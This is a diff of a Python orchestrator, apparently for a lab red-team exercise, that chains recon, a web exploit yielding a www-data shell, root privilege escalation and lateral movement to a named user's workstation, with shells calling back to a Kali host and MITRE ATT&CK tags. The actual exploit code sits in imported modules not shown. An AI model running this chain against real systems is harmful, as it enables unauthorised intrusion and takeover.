@@ -11,7 +11,6 @@ Add a new step by:
   2. Adding an ``_step_<name>`` adapter below.
   3. Appending a ``Step(...)`` entry to ``CHAIN``.
 """
-
 from __future__ import annotations
 
 import argparse
@@ -36,30 +35,13 @@ DEFAULT_TARGET = "router"
 DEFAULT_RESULTS_DIR = "/Attack-chain/results"
 DEFAULT_KALI_HOST = "10.10.0.2"
 DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
-DEFAULT_DEPLOY_KEY_FILE = "/shared-lab-keys/john_deploy_key"
 
 STEP_META = {
-    "recon": {
-        "tactic": "TA0043 · Reconnaissance",
-        "techniques": ["T1595", "T1592"],
-        "color": "cyan",
-    },
-    "exploit": {
-        "tactic": "TA0001 · Initial Access",
-        "techniques": ["T1190", "T1059.004"],
-        "color": "yellow",
-    },
-    "privesc": {
-        "tactic": "TA0004 · Privilege Escalation",
-        "techniques": ["T1053.003", "T1068"],
-        "color": "red",
-    },
-    "lateral": {
-        "tactic": "TA0008 · Lateral Movement",
-        "techniques": ["T1021.004", "T1078"],
-        "color": "magenta",
-    },
-    "cleanup": {"tactic": "operator hygiene", "techniques": [], "color": "green"},
+    "recon":   {"tactic": "TA0043 · Reconnaissance",       "techniques": ["T1595", "T1592"],     "color": "cyan"},
+    "exploit": {"tactic": "TA0001 · Initial Access",       "techniques": ["T1190", "T1059.004"], "color": "yellow"},
+    "privesc": {"tactic": "TA0004 · Privilege Escalation", "techniques": ["T1053.003", "T1068"], "color": "red"},
+    "lateral": {"tactic": "TA0008 · Lateral Movement",     "techniques": ["T1021.004", "T1078"], "color": "magenta"},
+    "cleanup": {"tactic": "operator hygiene",              "techniques": [],                     "color": "green"},
 }
 
 
@@ -87,7 +69,6 @@ class Step:
 # Rich helpers
 # ---------------------------------------------------------------------------
 
-
 def _print_banner(ctx: Context, steps: list[Step]) -> None:
     title = Text("⛓  ATTACK CHAIN", style="bold white")
     meta = (
@@ -114,9 +95,7 @@ def _print_step_header(step: Step, index: int, total: int) -> None:
     console.print()
 
 
-def _print_step_result(
-    step: Step, elapsed: float, success: bool, error: str = ""
-) -> None:
+def _print_step_result(step: Step, elapsed: float, success: bool, error: str = "") -> None:
     console.print()
     meta = STEP_META.get(step.name, {})
     color = meta.get("color", "white")
@@ -133,16 +112,19 @@ def _print_summary(results: list[dict]) -> None:
     console.print()
 
     table = Table(box=box.SIMPLE, show_header=True, header_style="dim", padding=(0, 2))
-    table.add_column("Step", style="bold white", no_wrap=True)
-    table.add_column("Status", no_wrap=True)
-    table.add_column("Time", style="dim", no_wrap=True)
-    table.add_column("Tactic", style="dim italic")
-    table.add_column("Techniques", style="dim")
+    table.add_column("Step",      style="bold white",  no_wrap=True)
+    table.add_column("Status",    no_wrap=True)
+    table.add_column("Time",      style="dim",         no_wrap=True)
+    table.add_column("Tactic",    style="dim italic")
+    table.add_column("Techniques",style="dim")
 
     for r in results:
         meta = STEP_META.get(r["name"], {})
         color = meta.get("color", "white")
-        status = f"[green]✓ ok[/green]" if r["ok"] else f"[red]✗ failed[/red]"
+        status = (
+            f"[green]✓ ok[/green]" if r["ok"]
+            else f"[red]✗ failed[/red]"
+        )
         techniques = " · ".join(meta.get("techniques", []))
         table.add_row(
             f"[{color}]{r['name']}[/{color}]",
@@ -159,17 +141,14 @@ def _print_summary(results: list[dict]) -> None:
 # Per-step adapters
 # ---------------------------------------------------------------------------
 
-
 def _step_recon(ctx: Context) -> dict[str, Any]:
     from initial_recon_1 import run as recon_run
-
     recon_run(target=ctx.target, results_dir=ctx.results_dir, wordlist=ctx.wordlist)
     return {"recon_results": ctx.results_dir}
 
 
 def _step_exploit(ctx: Context) -> dict[str, Any]:
     from initial_access import get_www_shell
-
     www_shell = get_www_shell(target_ip=ctx.target, kali_ip=ctx.kali_host)
     if www_shell is None:
         raise RuntimeError("exploit returned no www-data shell")
@@ -178,7 +157,6 @@ def _step_exploit(ctx: Context) -> dict[str, Any]:
 
 def _step_privesc(ctx: Context) -> dict[str, Any]:
     from privesc import run as privesc_run
-
     root_shell = privesc_run(ctx.state["www_shell"], kali_host=ctx.kali_host)
     if root_shell is None:
         raise RuntimeError("privesc returned no root shell")
@@ -187,28 +165,13 @@ def _step_privesc(ctx: Context) -> dict[str, Any]:
 
 def _step_lateral(ctx: Context) -> dict[str, Any]:
     from lateral_movement import run as lateral_run
-
-    deploy_key_file = ctx.state.get("deploy_key_file", DEFAULT_DEPLOY_KEY_FILE)
-    result = lateral_run(
-        deploy_key_file,
-        workstation_ip=ctx.state.get("workstation_ip", "10.30.0.5"),
-        workstation_user=ctx.state.get("workstation_user", "john.stravidis"),
-        workstation_port=ctx.state.get("workstation_port", 22),
+    john_shell = lateral_run(
+        root_shell=ctx.state["root_shell"],
         kali_host=ctx.kali_host,
-        kali_port=ctx.state.get("lateral_port", 6666),
-        pivot_shell=ctx.state.get("root_shell"),
     )
-
-    if not result.get("verification"):
-        raise RuntimeError("lateral movement did not confirm SSH foothold")
-
-    if result.get("reverse_shell") is not None:
-        ctx.state["lateral_shell"] = result["reverse_shell"]
-
-    return {
-        "lateral_verified": result.get("verification", ""),
-        "lateral_shell": result.get("reverse_shell"),
-    }
+    if john_shell is None:
+        raise RuntimeError("lateral movement returned no john.stravidis shell")
+    return {"john_shell": john_shell}
 
 
 def _teardown_close_socket(key: str) -> Callable[[Context], None]:
@@ -219,7 +182,6 @@ def _teardown_close_socket(key: str) -> Callable[[Context], None]:
                 sock.close()
             except Exception as exc:
                 log.warning("failed to close %s: %s", key, exc)
-
     return _close
 
 
@@ -228,27 +190,16 @@ def _teardown_close_socket(key: str) -> Callable[[Context], None]:
 # ---------------------------------------------------------------------------
 
 CHAIN: list[Step] = [
-    Step("recon", _step_recon),
-    Step("exploit", _step_exploit, teardown=_teardown_close_socket("www_shell")),
-    Step(
-        "privesc",
-        _step_privesc,
-        requires=("www_shell",),
-        teardown=_teardown_close_socket("root_shell"),
-    ),
-    Step(
-        "lateral",
-        _step_lateral,
-        requires=("root_shell",),
-        teardown=_teardown_close_socket("lateral_shell"),
-    ),
+    Step("recon",   _step_recon),
+    Step("exploit", _step_exploit,  teardown=_teardown_close_socket("www_shell")),
+    Step("privesc", _step_privesc,  requires=("www_shell",),  teardown=_teardown_close_socket("root_shell")),
+    Step("lateral", _step_lateral,  requires=("root_shell",), teardown=_teardown_close_socket("john_shell")),
 ]
 
 
 # ---------------------------------------------------------------------------
 # Selection + execution
 # ---------------------------------------------------------------------------
-
 
 def _index_of(name: str, steps: list[Step]) -> int:
     for i, step in enumerate(steps):
@@ -328,14 +279,12 @@ def run_chain(ctx: Context, *, only=None, start=None, stop=None) -> Context:
 # CLI
 # ---------------------------------------------------------------------------
 
-
 def _parse_args(argv: list[str]) -> argparse.Namespace:
     p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
     p.add_argument("--target", default=DEFAULT_TARGET)
     p.add_argument("--results-dir", default=DEFAULT_RESULTS_DIR)
     p.add_argument("--kali-host", default=DEFAULT_KALI_HOST)
     p.add_argument("--wordlist", default=DEFAULT_WORDLIST)
-    p.add_argument("--deploy-key-file", default=DEFAULT_DEPLOY_KEY_FILE)
 
     step_names = [s.name for s in CHAIN]
     sel = p.add_mutually_exclusive_group()
@@ -356,11 +305,7 @@ def _list_steps() -> None:
     for step in CHAIN:
         meta = STEP_META.get(step.name, {})
         color = meta.get("color", "white")
-        reqs = (
-            f"  [dim]requires: {', '.join(step.requires)}[/dim]"
-            if step.requires
-            else ""
-        )
+        reqs = f"  [dim]requires: {', '.join(step.requires)}[/dim]" if step.requires else ""
         opt = "  [dim][optional][/dim]" if step.optional else ""
         techniques = "  ".join(f"[dim]{t}[/dim]" for t in meta.get("techniques", []))
         console.print(
@@ -387,7 +332,6 @@ def main(argv: list[str] | None = None) -> int:
         kali_host=args.kali_host,
         wordlist=args.wordlist,
     )
-    ctx.state["deploy_key_file"] = args.deploy_key_file
     run_chain(ctx, only=args.only, start=args.start, stop=args.stop)
     return 0
 
